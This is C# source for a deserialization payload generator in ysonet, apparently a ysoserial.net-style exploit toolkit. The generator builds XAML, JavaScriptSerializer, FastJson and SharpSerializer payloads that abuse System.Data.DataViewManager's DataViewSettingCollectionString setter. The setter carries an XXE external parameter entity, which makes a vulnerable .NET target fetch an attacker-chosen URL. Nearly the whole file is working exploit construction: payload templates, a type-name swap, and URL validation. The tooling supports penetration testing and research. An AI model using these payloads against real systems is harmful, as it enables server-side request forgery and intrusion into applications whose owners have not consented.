using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Data.DataViewManager.DataViewSettingCollectionString parses its value with a
    /// legacy XmlTextReader. On a target that still uses the pre-4.5.2 XML defaults that
    /// reader carries a real XmlUrlResolver, so a DOCTYPE with an external parameter entity
    /// makes the deserializing process fetch a URL the operator chooses.
    ///
    /// The effect is a network request made by the target (SSRF / callback). It is NOT file
    /// disclosure: the setter reads elements and attributes only, never entity text, and it
    /// returns nothing to the sender.
    /// </summary>
    public class DataViewManagerXxeGenerator : GenericGenerator
    {
        // The effect proven by the tests is one outbound request from the target, so the
        // kind is network. Information disclosure is deliberately NOT declared: an external
        // DTD fetch proves SSRF, and nothing in this chain returns file content to the
        // sender.
        //
        // Versions stay unspecified on purpose. The gate is not a CLR build: every modern
        // 4.x runtime still fires this when the deserializing APPLICATION targets pre-4.5.2
        // or restores the legacy XML settings, and no runtime fires it under the hardened
        // default. A range would read as "these builds are vulnerable", which is wrong in
        // both directions, so the real condition is stated in AdditionalInfo() instead.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // The XXE-setter technique class is theirs (Friday the 13th: JSON Attacks, Black Hat
        // USA 2017). The DataViewManager carrier itself was found by this project's .NET
        // framework graph research.
        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Sets DataViewSettingCollectionString so the target's legacy XmlTextReader fetches an external DTD. Only fires when the target app uses pre-4.5.2 XML resolver defaults.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter here calls the PROPERTY SETTER by name. That is the whole
        // requirement, and it is also why the list is short: DataViewManager implements
        // IList, so a serializer that infers a contract (Json.NET, YamlDotNet,
        // DataContractSerializer, NetDataContractSerializer, XmlSerializer,
        // DataContractJsonSerializer, MessagePack typeless) builds a COLLECTION contract and
        // never touches the property. The field-based formatters (BinaryFormatter,
        // SoapFormatter, LosFormatter, FsPickler) cannot work either: they restore state
        // without calling a setter, and DataViewManager is not even [Serializable].
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.Xaml,
                Formatters.JavaScriptSerializer,
                Formatters.FastJson,
                Formatters.SharpSerializerXml,
                Formatters.SharpSerializerBinary
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        // No Options() override on purpose, so the gadget reports "no options" the way the
        // base class does. In particular there is no --rawinput twin of the other non-RCE
        // gadgets: the URL goes inside a quoted DTD external identifier inside an XML
        // document inside the outer payload, so an unescaped mode would only be a way to
        // build a broken or ambiguous payload. ValidateDtdUrl rejects instead.

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            string url = ValidateDtdUrl(inputArgs.Cmd);
            return FinishHandWrittenPayload(BuildPayload(url, formatter), formatter, inputArgs);
        }

        // The two spellings of the carrier's name: the assembly qualified form the JSON-family
        // serializers and the MessagePack/SharpSerializer type swaps need, and the space-free
        // form the hand written SharpSerializer XML document uses.
        private const string DataViewManagerAssemblyQualifiedName =
            "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        private const string DataViewManagerShortName =
            "System.Data.DataViewManager,System.Data,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        /// <summary>
        /// The XML the DataViewSettingCollectionString setter parses. The setter builds an
        /// XmlTextReader over this string and calls Read(), which parses the DOCTYPE before
        /// it validates the root name, so the external parameter entity is fetched first.
        ///
        /// The DOCTYPE name is the root name the setter expects, so the setter does not even
        /// throw afterwards.
        /// </summary>
        internal static string XxeXml(string dtdUrl)
        {
            return "<!DOCTYPE DataViewSettingCollectionString ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><DataViewSettingCollectionString/>";
        }

        // Every formatter here sets ONE property by name. The URL is never escaped with
        // --rawinput: it travels inside a quoted DTD external identifier inside an XML
        // document inside the outer payload, and ValidateDtdUrl has already rejected the
        // characters that would break any of those layers.
        private object BuildPayload(string url, string formatter)
        {
            string xml = XxeXml(url);

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                return @"<DataViewManager DataViewSettingCollectionString=""" + EscapeForXmlAttribute(xml, false) + @""" xmlns=""clr-namespace:System.Data;assembly=System.Data"" />";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    ""__type"":""" + DataViewManagerAssemblyQualifiedName + @""",
    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        """ + DataViewManagerAssemblyQualifiedName + @""":""1""
    },
    ""$type"":""1"",
    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""" + DataViewManagerShortName + @""">
    <Properties>
        <Simple name=""DataViewSettingCollectionString"" value=""" + EscapeForXmlAttribute(xml, false) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
            {
                // No document to hand write here, and constructing the real DataViewManager
                // would fire the payload inside ysonet, so serialize the surrogate below and
                // swap the type name in the stream.
                return SharpSerializerTypeSwap.SerializeAs(
                    new DataViewManagerSurrogate { DataViewSettingCollectionString = xml },
                    DataViewManagerAssemblyQualifiedName);
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only: the property name is what SharpSerializer writes into the binary
        // stream. Never deserialized as itself - SharpSerializerTypeSwap rewrites the type
        // name to System.Data.DataViewManager before the payload leaves ysonet.
        internal sealed class DataViewManagerSurrogate
        {
            public string DataViewSettingCollectionString { get; set; }
        }

        /// <summary>
        /// The URL is placed in a quoted DTD external identifier (a SystemLiteral), so the
        /// one character it can never carry is the double quote that would end the literal.
        /// Whitespace, control characters, and raw angle brackets are rejected too: none of
        /// them are valid in a URL, and they are the ones that survive escaping badly.
        ///
        /// '&amp;' and '%' are deliberately ALLOWED. A SystemLiteral recognises neither
        /// entity nor parameter-entity references, so both are literal there, and banning
        /// them would break ordinary query strings and percent-encoding.
        /// </summary>
        internal static string ValidateDtdUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url))
                throw new ArgumentException(
                    "DataViewManagerXxe requires an external DTD URL in -c, for example -c \"http://127.0.0.1:8080/x.dtd\".");

            url = url.Trim();

            foreach (char c in url)
            {
                if (char.IsControl(c) || char.IsWhiteSpace(c))
                    throw new ArgumentException(
                        "The DTD URL must not contain whitespace or control characters. Percent-encode them instead.");
                if (c == '"' || c == '<' || c == '>' || c == '\\')
                    throw new ArgumentException(
                        "The DTD URL must not contain the characters \" < > or \\, because it is placed in a quoted DTD external identifier. Percent-encode them instead.");
            }

            Uri parsed;
            if (!Uri.TryCreate(url, UriKind.Absolute, out parsed))
                throw new ArgumentException(
                    "The DTD URL must be an absolute URL, for example http://127.0.0.1:8080/x.dtd.");

            if (parsed.Scheme != Uri.UriSchemeHttp && parsed.Scheme != Uri.UriSchemeHttps)
                throw new ArgumentException(
                    "The DTD URL must use http or https. Scheme '" + parsed.Scheme + "' is not supported by this gadget.");

            return url;
        }
    }
}
